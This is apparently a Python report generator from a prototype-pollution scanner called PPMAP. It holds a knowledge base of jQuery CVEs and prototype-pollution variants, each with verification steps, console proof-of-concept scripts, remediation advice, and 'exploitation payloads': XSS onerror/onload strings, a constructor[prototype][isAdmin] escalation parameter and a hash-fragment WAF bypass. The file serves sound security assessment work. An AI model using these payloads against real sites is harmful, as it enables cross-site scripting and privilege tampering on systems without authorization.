"""Report generator utilities with manual verification steps and PoC scripts."""
from pathlib import Path
import csv
import json
from datetime import datetime
import logging
from urllib.parse import urlparse, quote
from html import escape as html_escape
import re
logger = logging.getLogger(__name__)

# ==============================================================================
# CVE Knowledge Base — manual verification steps + PoC per finding type
# ==============================================================================
CVE_KNOWLEDGE = {
    # CVE-2019-11358: Prototype Pollution via $.extend()
    # BUG FIX: affected was '< 3.5.0' -- actual fix was in 3.4.0
    'CVE-2019-11358': {
        'title': 'jQuery $.extend() Prototype Pollution',
        'affected': 'jQuery >= 1.0.3, < 3.4.0',
        'severity': 'CRITICAL',
        'reference': 'https://nvd.nist.gov/vuln/detail/CVE-2019-11358',
        'description': (
            'jQuery $.extend(true, ...) performs deep merge without checking '
            'for __proto__ keys, allowing an attacker to inject properties '
            'into Object.prototype that affect all JavaScript objects. '
            'Fixed in jQuery 3.4.0 (NOT 3.5.0 as commonly misreported).'
        ),
        'manual_steps': [
            'Open target URL in browser',
            'Press F12 -> Console tab',
            "Run: $.extend(true, {}, JSON.parse('{\"__proto__\": {\"pptest\": true}}')",
            'Run: console.log(({}).pptest)  ->  should print "true" if vulnerable',
            'Run: delete Object.prototype.pptest  (cleanup)',
            'Screenshot the console output as evidence',
        ],
        'poc_script': '''// CVE-2019-11358 -- Prototype Pollution PoC
(function() {
    var marker = 'ppmap_poc_' + Date.now();
    $.extend(true, {}, JSON.parse('{"__proto__": {"' + marker + '": "POLLUTED"}}'));
    if (({})[ marker ] === 'POLLUTED') {
        console.log('VULNERABLE: Object.prototype.' + marker + ' = "POLLUTED"');
        delete Object.prototype[marker];
    } else {
        console.log('Not vulnerable or already patched');
    }
})();''',
        'xss_payloads': [
            "$.extend(true, {}, JSON.parse('{\"__proto__\": {\"innerHTML\": \"<img src=x onerror=alert(1)>\"}}'))",
        ],
        'remediation': [
            'Upgrade jQuery to >= 3.4.0 for PP fix, >= 3.5.0 for full XSS fix',
            'Replace $.extend(true, ...) with Object.assign() or spread syntax',
            'Apply Content Security Policy (CSP) headers',
            'Use Object.freeze(Object.prototype) in critical paths',
        ],
    },
    # CVE-2020-11022: HTML Prefilter XSS
    'CVE-2020-11022': {
        'title': 'jQuery HTML Prefilter XSS via .html()/.append()',
        'affected': 'jQuery >= 1.2, < 3.5.0',
        'severity': 'HIGH',
        'reference': 'https://nvd.nist.gov/vuln/detail/CVE-2020-11022',
        'description': (
            'jQuery htmlPrefilter() uses a regex-only approach to neutralize self-closing tags. '
            'Payloads like <style></style><img onerror=...> bypass the regex and execute '
            'when passed to .html(), .append(), .after(), .before() etc. '
            'NOTE: <option><style></option> pattern is CVE-2020-11023, NOT this CVE.'
        ),
        'manual_steps': [
            'Open target URL in browser',
            'Press F12 -> Console tab',
            'Run the PoC script below',
            'If _cve22_ is true after 500ms, page is vulnerable',
        ],
        'poc_script': '''// CVE-2020-11022 -- htmlPrefilter XSS PoC
// BUG FIX: old PoC used <option><style></option> which is CVE-2020-11023!
// CVE-2020-11022: <style></style><img onerror> bypasses htmlPrefilter regex
(function() {
    window._cve22_ = false;
    var d = $('<div>').css('display','none').appendTo('body');
    try {
        d.html('<style></style><img src=x onerror="window._cve22_=true">');
        setTimeout(function(){
            console.log(window._cve22_ ? 'CVE-2020-11022 TRIGGERED' : 'NOT triggered');
            d.remove();
        }, 500);
    } catch(e) { d.remove(); }
})();''',
        'xss_payloads': [
            '<style></style><img src=x onerror=alert(document.domain)>',
            '<style></style><svg onload=alert(1)>',
        ],
        'remediation': [
            'Upgrade jQuery to >= 3.5.0',
            'Use DOMPurify to sanitize HTML before $.html()/.append()',
            'Never pass untrusted input directly to jQuery DOM methods',
            "Set CSP header: script-src 'self'",
        ],
    },
    # CVE-2020-11023: <option> element XSS -- was MISSING from CVE_KNOWLEDGE
    'CVE-2020-11023': {
        'title': 'jQuery <option> element XSS via .html()/.append()',
        'affected': 'jQuery >= 1.0.3, < 3.5.0',
        'severity': 'HIGH',
        'reference': 'https://nvd.nist.gov/vuln/detail/CVE-2020-11023',
        'description': (
            'Passing HTML containing <option> elements with untrusted content to jQuery '
            'DOM manipulation methods can execute arbitrary code. Added to CISA KEV. '
            'Pattern: <option><img src=x onerror=...></option>'
        ),
        'manual_steps': [
            'Press F12 -> Console tab',
            'Run the PoC script below',
            'If _cve23_ is true after 500ms, page is vulnerable',
        ],
        'poc_script': '''// CVE-2020-11023 -- <option> element XSS PoC
(function() {
    window._cve23_ = false;
    var sel = $('<select>').css('display','none').appendTo('body');
    sel.html('<option><img src=x onerror="window._cve23_=true"></option>');
    setTimeout(function(){
        console.log(window._cve23_ ? 'CVE-2020-11023 TRIGGERED' : 'NOT triggered');
        sel.remove();
    }, 500);
})();''',
        'xss_payloads': [
            '<option><img src=x onerror=alert(document.domain)></option>',
        ],
        'remediation': [
            'Upgrade jQuery to >= 3.5.0',
            'Sanitize HTML before passing to .html()/.append()',
        ],
    },
    # CVE-2020-23064: DOM Manipulation XSS -- was MISSING from CVE_KNOWLEDGE
    'CVE-2020-23064': {
        'title': 'jQuery DOM Manipulation XSS (.append/.before/.after)',
        'affected': 'jQuery >= 1.0.3, < 3.5.0',
        'severity': 'HIGH',
        'reference': 'https://nvd.nist.gov/vuln/detail/CVE-2020-23064',
        'description': (
            'jQuery DOM manipulation methods .before(), .after(), .replaceWith(), .append() '
            'do not sanitize HTML, allowing XSS when user data is passed without sanitization. '
            'Pattern: .append("<img/><img src=x onerror=...>")'
        ),
        'manual_steps': [
            'Press F12 -> Console tab',
            'Run the PoC script below',
            'If _cve64_ is true after 500ms, page is vulnerable',
        ],
        'poc_script': '''// CVE-2020-23064 -- DOM Manipulation XSS PoC
(function() {
    window._cve64_ = false;
    var d = $('<div>').css('display','none').appendTo('body');
    d.append('<img/><img src=x onerror="window._cve64_=true">');
    setTimeout(function(){
        console.log(window._cve64_ ? 'CVE-2020-23064 TRIGGERED' : 'NOT triggered');
        d.remove();
    }, 500);
})();''',
        'xss_payloads': [
            '<img/><img src=x onerror=alert(document.domain)>',
        ],
        'remediation': [
            'Upgrade jQuery to >= 3.5.0',
            'Never pass user-controlled strings to .before()/.after()/.append()',
        ],
    },
    # CVE-2015-9251: Cross-domain AJAX auto-eval XSS
    # BUG FIX 1: severity was HIGH, NVD says MEDIUM
    # BUG FIX 2: affected was '< 2.2.0 / < 1.12.0' -- correct: >= 1.0, < 3.0.0
    # BUG FIX 3: title/description said 'CSS import' -- correct: AJAX auto-eval globalEval
    # BUG FIX 4: PoC version check was < 2.2.0 -- should check globalEval converter
    'CVE-2015-9251': {
        'title': 'jQuery Cross-domain AJAX auto-eval XSS',
        'affected': 'jQuery >= 1.0, < 3.0.0',
        'severity': 'MEDIUM',
        'reference': 'https://nvd.nist.gov/vuln/detail/CVE-2015-9251',
        'description': (
            'When jQuery makes cross-domain AJAX requests without specifying dataType, '
            "responses with Content-Type: text/javascript are auto-eval'd via globalEval(). "
            'converters["text script"] = globalEval is present in all 1.x/2.x versions. '
            'Fixed in jQuery 3.0.0 which removed the auto-eval converter.'
        ),
        'manual_steps': [
            'Check jQuery version: jQuery.fn.jquery (must be < 3.0.0)',
            'Run: typeof jQuery.ajaxSettings.converters["text script"] === "function"',
            'If result is TRUE, the auto-eval converter is ACTIVE (vulnerable)',
            'Find AJAX requests lacking explicit dataType in Network tab',
        ],
        'poc_script': '''// CVE-2015-9251 -- AJAX auto-eval converter check
// BUG FIX: old PoC only checked version < 2.2.0 (wrong range, was also wrong pattern)
(function() {
    var ver = jQuery.fn.jquery;
    console.log("jQuery version: " + ver);
    var conv = jQuery.ajaxSettings && jQuery.ajaxSettings.converters;
    var active = conv && typeof conv["text script"] === "function";
    if (active) {
        console.log("VULNERABLE to CVE-2015-9251 (jQuery < 3.0.0)");
        console.log("converters[text script] = globalEval is ACTIVE");
    } else {
        console.log("Converter not active -- jQuery >= 3.0.0 or patched");
    }
})();''',
        'xss_payloads': [],
        'remediation': [
            'Upgrade jQuery to >= 3.0.0 (auto-eval converter removed)',
            'Always specify dataType in $.ajax() calls: dataType: "json"',
            'Implement strict CORS policy on server',
        ],
    },
}


CONSTRUCTOR_PP_KNOWLEDGE = {
    'title': 'Constructor-based Prototype Pollution',
    'severity': 'CRITICAL',
    'reference': 'https://portswigger.net/research/server-side-prototype-pollution',
    'description': (
        'The server reflects constructor[prototype] payloads without sanitization. '
        'This bypasses __proto__ filters by using the constructor.prototype path '
        'to reach Object.prototype.'
    ),
    'manual_steps': [
        'Open target URL in browser',
        'Append: ?constructor[prototype][pptest]=POLLUTED',
        'Press F12 → Console tab',
        'Run: console.log(({}).pptest)  →  should print "POLLUTED" if vulnerable',
        'Try escalation payload: ?constructor[prototype][isAdmin]=true',
        'Screenshot the console output as evidence',
    ],
    'poc_script': '''\
// Constructor PP — Manual Console PoC
(function(){
    // Check if current page is already polluted
    if (({}).pptest !== undefined) {
        console.log('✅ Object.prototype.pptest =', ({}).pptest);
    } else {
        console.log('⚠️  Navigate to: ' + location.href.split('?')[0] + '?constructor[prototype][pptest]=POLLUTED');
        console.log('Then re-run this script to verify.');
    }
})();''',
    'xss_payloads': [
        '?constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>',
        '?constructor[prototype][src]=data:,alert(document.domain)',
        '?constructor[prototype][isAdmin]=true',
    ],
    'remediation': [
        'Sanitize user input: reject keys containing "constructor", "__proto__", "prototype"',
        'Use Object.create(null) for merge targets',
        'Use allowlists for accepted object keys in query parameters',
        'Apply Object.freeze(Object.prototype) as defense-in-depth',
    ],
}

HASH_PP_KNOWLEDGE = {
    'title': 'Hash-based Prototype Pollution (WAF Bypass)',
    'severity': 'HIGH',
    'description': (
        'The page processes URL hash fragments (#__proto__[key]=value) without '
        'sanitization, allowing prototype pollution that bypasses WAFs which '
        'only inspect query parameters.'
    ),
    'manual_steps': [
        'Open target URL in browser',
        'Append: #__proto__[pptest]=POLLUTED  (note: uses # not ?)',
        'Press F12 → Console tab',
        'Run: console.log(({}).pptest)  →  should print "POLLUTED" if vulnerable',
        'The # fragment is NOT sent to the server, so WAF cannot block it',
        'Screenshot the console output as evidence',
    ],
    'poc_script': '''\
// Hash-based PP — Console PoC
(function() {
    if (({}).pptest !== undefined) {
        console.log('✅ Object.prototype.pptest =', ({}).pptest);
    } else {
        location.hash = '__proto__[pptest]=POLLUTED';
        setTimeout(function(){
            console.log('Result:', ({}).pptest);
        }, 1000);
    }
})();''',
    'remediation': [
        'Do not parse URL hash fragments as key-value pairs',
        'Use safe merge functions that skip __proto__ and constructor',
        'Apply Object.freeze(Object.prototype)',
    ],
}


# ==============================================================================
# Helper: build finding sections
# ==============================================================================
def _get_finding_knowledge(finding: dict) -> dict:
    """Return knowledge dict for a finding based on its CVE or type."""
    cve = finding.get('cve', '')
    ftype = finding.get('type', '')

    if cve in CVE_KNOWLEDGE:
        return CVE_KNOWLEDGE[cve]
    if ftype == 'jquery_pp_verified':
        return CVE_KNOWLEDGE.get('CVE-2019-11358', {})
    if ftype == 'jquery_xss_verified':
        return CVE_KNOWLEDGE.get('CVE-2020-11022', {})
    if ftype == 'constructor_pollution':
        return CONSTRUCTOR_PP_KNOWLEDGE
    if ftype == 'hash_based_pp':
        return HASH_PP_KNOWLEDGE
    return {}


# ==============================================================================
# EnhancedReportGenerator
# ==============================================================================
class EnhancedReportGenerator:
    def __init__(self, output_dir: str = './reports'):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def _sanitize_domain(self, target_url: str) -> str:
        """Extract and sanitize domain from target URL for directory naming."""
        try:
            parsed = urlparse(target_url)
            domain = parsed.netloc or parsed.path.split('/')[0]
            domain = domain.replace('www.', '').split(':')[0]
            domain = re.sub(r'[^a-zA-Z0-9.-]', '_', domain)
            domain = domain.replace('.', '_')
            return domain or 'unknown_target'
        except Exception:
            return 'unknown_target'

    # ------------------------------------------------------------------
    # CSV — unchanged (tabular data doesn't need PoC scripts)
    # ------------------------------------------------------------------
    def generate_csv_report(self, findings: list, filename: str = None) -> str:
        if not findings:
            return ''
        if not filename:
            filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        fp = self.output_dir / filename
        try:
            keys = set()
            for f in findings:
                if isinstance(f, dict):
                    keys.update(f.keys())
            keys = sorted(keys)
            with open(fp, 'w', newline='') as fh:
                writer = csv.DictWriter(fh, fieldnames=keys, restval='')
                writer.writeheader()
                for f in findings:
                    writer.writerow(f)
            return str(fp)
        except Exception as e:
            logger.error(f"CSV generation failed: {e}")
            return ''

    # ------------------------------------------------------------------
    # MARKDOWN — professional pentest report
    # ------------------------------------------------------------------
    def generate_markdown_report(self, findings: list, target: str = '',
                                  filename: str = None) -> str:
        if not filename:
            filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        fp = self.output_dir / filename
        try:
            lines = []
            lines.append(f'# PPMAP Security Assessment Report')
            lines.append(f'')
            lines.append(f'| Field | Value |')
            lines.append(f'|-------|-------|')
            lines.append(f'| **Target** | `{target}` |')
            lines.append(f'| **Date** | {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} |')
            lines.append(f'| **Scanner** | PPMAP v4.0 Enterprise |')
            lines.append(f'| **Total Findings** | {len(findings)} |')
            lines.append(f'')

            # Summary table
            lines.append(f'## Executive Summary')
            lines.append(f'')
            crit = sum(1 for f in findings if 'CRITICAL' in str(f.get('severity', '')).upper())
            high = sum(1 for f in findings if 'HIGH' in str(f.get('severity', '')).upper() and 'CRITICAL' not in str(f.get('severity', '')).upper())
            med = sum(1 for f in findings if 'MEDIUM' in str(f.get('severity', '')).upper())
            low = sum(1 for f in findings if 'LOW' in str(f.get('severity', '')).upper())

            lines.append(f'| Severity | Count |')
            lines.append(f'|----------|-------|')
            if crit: lines.append(f'| 🔴 CRITICAL | {crit} |')
            if high: lines.append(f'| 🟠 HIGH | {high} |')
            if med: lines.append(f'| 🟡 MEDIUM | {med} |')
            if low: lines.append(f'| 🟢 LOW | {low} |')
            lines.append(f'')

            # Detailed findings
            lines.append(f'---')
            lines.append(f'')
            lines.append(f'## Detailed Findings')
            lines.append(f'')

            for i, f in enumerate(findings, 1):
                kb = _get_finding_knowledge(f)
                name = f.get('name', kb.get('title', f.get('type', 'Unknown')))
                severity = f.get('severity', 'MEDIUM')
                cve = f.get('cve', '')
                verified = f.get('verified', False)
                jquery_ver = f.get('jquery_version', '')

                lines.append(f'### Finding {i}: {name}')
                lines.append(f'')
                lines.append(f'| Field | Value |')
                lines.append(f'|-------|-------|')
                lines.append(f'| **Severity** | {severity} |')
                if cve:
                    lines.append(f'| **CVE** | [{cve}]({kb.get("reference", "")}) |')
                if jquery_ver:
                    lines.append(f'| **jQuery Version** | {jquery_ver} |')
                if kb.get('affected'):
                    lines.append(f'| **Affected** | {kb["affected"]} |')
                lines.append(f'| **Verified** | {"✅ Yes" if verified else "⚠️ Version-based"} |')
                lines.append(f'')

                # Description
                if kb.get('description'):
                    lines.append(f'**Description:**')
                    lines.append(f'{kb["description"]}')
                    lines.append(f'')
                elif f.get('description'):
                    lines.append(f'**Description:**')
                    lines.append(str(f['description']))
                    lines.append(f'')

                # Payload
                payload = f.get('payload', '')
                if payload:
                    payload_str = json.dumps(payload, indent=2) if isinstance(payload, (dict, list)) else str(payload)
                    lines.append(f'**Detection Payload:**')
                    lines.append(f'```')
                    lines.append(payload_str)
                    lines.append(f'```')
                    lines.append(f'')

                # Manual Verification Steps
                if kb.get('manual_steps'):
                    lines.append(f'**Manual Verification Steps:**')
                    for step_num, step in enumerate(kb['manual_steps'], 1):
                        lines.append(f'{step_num}. {step}')
                    lines.append(f'')

                # PoC Script
                if kb.get('poc_script'):
                    lines.append(f'**Copy-Paste PoC Script (F12 → Console):**')
                    lines.append(f'```javascript')
                    lines.append(kb['poc_script'])
                    lines.append(f'```')
                    lines.append(f'')

                # XSS Payloads
                if kb.get('xss_payloads'):
                    lines.append(f'**Exploitation Payloads:**')
                    for xp in kb['xss_payloads']:
                        lines.append(f'```')
                        lines.append(f'{xp}')
                        lines.append(f'```')
                    lines.append(f'')

                # Remediation
                if kb.get('remediation'):
                    lines.append(f'**Remediation:**')
                    for r in kb['remediation']:
                        lines.append(f'- {r}')
                    lines.append(f'')

                lines.append(f'---')
                lines.append(f'')

            # General recommendations
            lines.append(f'## General Recommendations')
            lines.append(f'')
            lines.append(f'1. **Validate Manually** — Always verify findings in browser Console (F12) with the PoC scripts above')
            lines.append(f'2. **Screenshot Evidence** — Take screenshots of Console before & after payload execution')
            lines.append(f'3. **Test on Staging** — Never run exploitation payloads on production without authorization')
            lines.append(f'4. **Track Remediations** — Document which fixes were applied and verify after deployment')
            lines.append(f'')
            lines.append(f'---')
            lines.append(f'')
            lines.append(f'> ⚠️ **Disclaimer:** This report was generated by PPMAP for **authorized security testing only**.')
            lines.append(f'> Unauthorized access to computer systems is illegal.')
            lines.append(f'> Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')

            content = '\n'.join(lines)
            with open(fp, 'w') as fh:
                fh.write(content)
            return str(fp)
        except Exception as e:
            logger.error(f"Markdown generation failed: {e}")
            return ''

    # ------------------------------------------------------------------
    # HTML — professional pentest report
    # ------------------------------------------------------------------
    def generate_html_report(self, findings: list, target: str = '',
                              filename: str = None) -> str:
        if not filename:
            filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        fp = self.output_dir / filename

        try:
            crit = sum(1 for f in findings if 'CRITICAL' in str(f.get('severity', '')).upper())
            high = sum(1 for f in findings if 'HIGH' in str(f.get('severity', '')).upper() and 'CRITICAL' not in str(f.get('severity', '')).upper())

            html = f"""\
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PPMAP Report — {html_escape(target)}</title>
    <style>
        :root {{
            --bg: #0f1117; --surface: #1a1d27; --surface2: #242836;
            --text: #e4e6f0; --text2: #9ba1b8; --accent: #6c72cb;
            --red: #ff6b6b; --orange: #ffa94d; --yellow: #ffd43b;
            --green: #69db7c; --blue: #74c0fc; --border: #2d3148;
        }}
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ font-family: 'Segoe UI',system-ui,-apple-system,sans-serif; background:var(--bg); color:var(--text); line-height:1.6; }}
        .container {{ max-width:1100px; margin:0 auto; padding:2rem 1.5rem; }}

        /* Header */
        .header {{ background:linear-gradient(135deg,#1e2130 0%,#2a2d42 100%); border:1px solid var(--border); border-radius:12px; padding:2rem; margin-bottom:2rem; }}
        .header h1 {{ font-size:1.6rem; color:var(--accent); margin-bottom:.5rem; }}
        .meta {{ display:flex; gap:2rem; flex-wrap:wrap; font-size:.85rem; color:var(--text2); }}

        /* Stats */
        .stats {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr)); gap:1rem; margin-bottom:2rem; }}
        .stat {{ background:var(--surface); border:1px solid var(--border); border-radius:8px; padding:1.2rem; text-align:center; }}
        .stat .value {{ font-size:2rem; font-weight:700; }}
        .stat .label {{ font-size:.75rem; color:var(--text2); text-transform:uppercase; letter-spacing:.5px; margin-top:.3rem; }}
        .crit .value {{ color:var(--red); }}
        .high-stat .value {{ color:var(--orange); }}

        /* Finding cards */
        .finding {{ background:var(--surface); border:1px solid var(--border); border-radius:10px; margin-bottom:1.5rem; overflow:hidden; }}
        .finding-header {{ padding:1rem 1.5rem; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; }}
        .finding-header h3 {{ font-size:1rem; }}
        .badge {{ padding:3px 10px; border-radius:4px; font-size:.75rem; font-weight:600; text-transform:uppercase; }}
        .badge-critical {{ background:#3d1f1f; color:var(--red); border:1px solid #5c2e2e; }}
        .badge-high {{ background:#3d2e1a; color:var(--orange); border:1px solid #5c4428; }}
        .badge-medium {{ background:#3d3a1a; color:var(--yellow); border:1px solid #5c5728; }}
        .badge-low {{ background:#1a3d24; color:var(--green); border:1px solid #285c36; }}
        .verified {{ color:var(--green); font-size:.8rem; margin-left:.5rem; }}
        .unverified {{ color:var(--yellow); font-size:.8rem; margin-left:.5rem; }}

        .finding-body {{ padding:1.5rem; }}
        .finding-body .section {{ margin-bottom:1.2rem; }}
        .finding-body .section-title {{ font-size:.85rem; font-weight:600; color:var(--accent); text-transform:uppercase; letter-spacing:.5px; margin-bottom:.5rem; }}
        .finding-body p {{ font-size:.9rem; color:var(--text2); }}
        .finding-body table {{ width:100%; border-collapse:collapse; font-size:.85rem; margin:.5rem 0; }}
        .finding-body td {{ padding:6px 10px; border-bottom:1px solid var(--border); }}
        .finding-body td:first-child {{ color:var(--text2); width:130px; }}

        /* Code blocks */
        pre {{ background:var(--surface2); border:1px solid var(--border); border-radius:6px; padding:1rem; font-family:'Cascadia Code','Fira Code',monospace; font-size:.82rem; overflow-x:auto; white-space:pre-wrap; word-break:break-all; }}
        code {{ font-family:inherit; }}
        .copy-btn {{ float:right; background:var(--accent); color:#fff; border:none; padding:4px 10px; border-radius:4px; cursor:pointer; font-size:.7rem; }}
        .copy-btn:hover {{ opacity:.8; }}

        /* Steps */
        ol.steps {{ padding-left:1.5rem; }}
        ol.steps li {{ margin-bottom:.4rem; font-size:.9rem; color:var(--text2); }}
        ol.steps li::marker {{ color:var(--accent); font-weight:bold; }}

        /* Remediation */
        .remediation {{ background:#1a2a1f; border:1px solid #285c36; border-radius:6px; padding:1rem; }}
        .remediation li {{ margin-bottom:.3rem; font-size:.85rem; color:var(--green); }}

        /* Footer */
        .footer {{ text-align:center; padding:2rem 0; color:var(--text2); font-size:.8rem; border-top:1px solid var(--border); margin-top:2rem; }}
        a {{ color:var(--blue); text-decoration:none; }}
        a:hover {{ text-decoration:underline; }}
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🔍 PPMAP Security Assessment Report</h1>
        <div class="meta">
            <span><strong>Target:</strong> {html_escape(target)}</span>
            <span><strong>Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</span>
            <span><strong>Scanner:</strong> PPMAP v4.0 Enterprise</span>
        </div>
    </div>

    <div class="stats">
        <div class="stat"><div class="value">{len(findings)}</div><div class="label">Total Findings</div></div>
        <div class="stat crit"><div class="value">{crit}</div><div class="label">Critical</div></div>
        <div class="stat high-stat"><div class="value">{high}</div><div class="label">High</div></div>
    </div>
"""

            for idx, f in enumerate(findings, 1):
                kb = _get_finding_knowledge(f)
                name = f.get('name', kb.get('title', f.get('type', 'Unknown')))
                severity = str(f.get('severity', 'MEDIUM')).upper()
                cve = f.get('cve', '')
                verified = f.get('verified', False)
                jquery_ver = f.get('jquery_version', '')
                payload = f.get('payload', '')

                sev_lower = severity.split()[0].lower()
                if sev_lower not in ('critical', 'high', 'medium', 'low'):
                    sev_lower = 'medium'

                ver_label = '<span class="verified">✅ Verified</span>' if verified else '<span class="unverified">⚠️ Version-based</span>'

                html += f"""
    <div class="finding">
        <div class="finding-header">
            <h3>#{idx} — {html_escape(str(name))}</h3>
            <div><span class="badge badge-{sev_lower}">{html_escape(severity)}</span>{ver_label}</div>
        </div>
        <div class="finding-body">
            <div class="section">
                <table>
"""
                if cve:
                    html += f'<tr><td>CVE</td><td><a href="{html_escape(kb.get("reference", ""))}" target="_blank">{html_escape(str(cve))}</a></td></tr>\n'
                if jquery_ver:
                    html += f'<tr><td>jQuery</td><td>{html_escape(str(jquery_ver))}</td></tr>\n'
                if kb.get('affected'):
                    html += f'<tr><td>Affected</td><td>{html_escape(str(kb["affected"]))}</td></tr>\n'
                html += '</table></div>\n'

                # Description
                desc = kb.get('description', f.get('description', ''))
                if desc:
                    html += f'<div class="section"><div class="section-title">Description</div><p>{html_escape(str(desc))}</p></div>\n'

                # Payload
                if payload:
                    payload_str = json.dumps(payload, indent=2) if isinstance(payload, (dict, list)) else str(payload)
                    html += f'<div class="section"><div class="section-title">Detection Payload</div><pre><code>{html_escape(payload_str)}</code></pre></div>\n'

                # Manual Steps
                if kb.get('manual_steps'):
                    html += '<div class="section"><div class="section-title">📋 Manual Verification Steps</div><ol class="steps">\n'
                    for step in kb['manual_steps']:
                        html += f'<li>{html_escape(step)}</li>\n'
                    html += '</ol></div>\n'

                # PoC Script
                if kb.get('poc_script'):
                    esc_script = html_escape(kb['poc_script'])
                    html += f"""<div class="section"><div class="section-title">🧪 PoC Script (F12 → Console)</div>
<pre><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextElementSibling.textContent)">Copy</button><code>{esc_script}</code></pre></div>\n"""

                # XSS Payloads
                if kb.get('xss_payloads'):
                    html += '<div class="section"><div class="section-title">⚡ Exploitation Payloads</div>\n'
                    for xp in kb['xss_payloads']:
                        html += f'<pre><code>{html_escape(xp)}</code></pre>\n'
                    html += '</div>\n'

                # Remediation
                if kb.get('remediation'):
                    html += '<div class="section"><div class="section-title">🛡️ Remediation</div><div class="remediation"><ul>\n'
                    for r in kb['remediation']:
                        html += f'<li>{html_escape(r)}</li>\n'
                    html += '</ul></div></div>\n'

                html += '</div></div>\n'

            html += f"""
    <div class="footer">
        <p>⚠️ This report was generated by PPMAP for <strong>authorized security testing only</strong>.</p>
        <p>Unauthorized access to computer systems is illegal.</p>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
</div>
</body>
</html>"""

            with open(fp, 'w') as fh:
                fh.write(html)
            return str(fp)
        except Exception as e:
            logger.error(f"HTML generation failed: {e}")
            return ''

    # ------------------------------------------------------------------
    # Generate all formats
    # ------------------------------------------------------------------
    def generate_all_formats(self, findings: list, target: str = '',
                              formats: list = None) -> dict:
        """Generate multiple report formats and return dict of created file paths.
        Creates target-specific subdirectory: reports/DOMAIN_TIMESTAMP/
        """
        if formats is None:
            formats = ['json', 'html']

        generated = {}
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

        # Create target-specific subdirectory
        domain = self._sanitize_domain(target)
        date_str = datetime.now().strftime('%Y%m%d')
        target_dir = self.output_dir / f"{domain}_{date_str}"
        target_dir.mkdir(parents=True, exist_ok=True)

        original_output_dir = self.output_dir
        self.output_dir = target_dir

        if 'json' in formats:
            try:
                fp = self.output_dir / f"report_{timestamp}.json"
                with open(fp, 'w') as fh:
                    json.dump(findings, fh, indent=2)
                generated['json'] = str(fp)
            except Exception as e:
                logger.error(f"JSON report failed: {e}")

        if 'md' in formats or 'markdown' in formats:
            md = self.generate_markdown_report(findings, target, f"report_{timestamp}.md")
            if md:
                generated['md'] = md

        if 'csv' in formats:
            csvf = self.generate_csv_report(findings, f"report_{timestamp}.csv")
            if csvf:
                generated['csv'] = csvf

        if 'html' in formats:
            html = self.generate_html_report(findings, target, f"report_{timestamp}.html")
            if html:
                generated['html'] = html

        self.output_dir = original_output_dir
        return generated
